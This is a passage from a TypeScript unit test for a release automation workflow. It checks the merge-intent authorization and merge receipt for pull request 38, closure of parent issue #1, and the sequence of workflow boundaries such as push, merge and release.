      pullRequestNumber: 38,
    }));
    expect(authorizationInputs).toEqual([
      expect.objectContaining({
        releaseId,
        intent: expect.objectContaining({
          kind: 'merge-intent',
          pullRequestNumber: 38,
          expectedHead: headSha,
          observedPrHead: headSha,
        }),
      }),
    ]);
    expect(completionInputs).toEqual([
      expect.objectContaining({
        releaseId,
        receipt: expect.objectContaining({
          kind: 'merge',
          pullRequestNumber: 38,
          expectedHead: headSha,
          observedPrHead: headSha,
          mergeSha: 'b'.repeat(40),
        }),
      }),
    ]);
    expect(progress).toEqual(expect.arrayContaining([
      expect.objectContaining({
        step: 'parent Issue #1 closed',
        parentIssueNumber: 1,
      }),
    ]));
    for (const boundary of ['claim', 'provider', 'push', 'merge', 'release'] as const) {
      expect(boundaries).toContain(boundary);
    }
    expect(boundaries.filter((boundary) => boundary === 'push')).toHaveLength(2);
  });
});
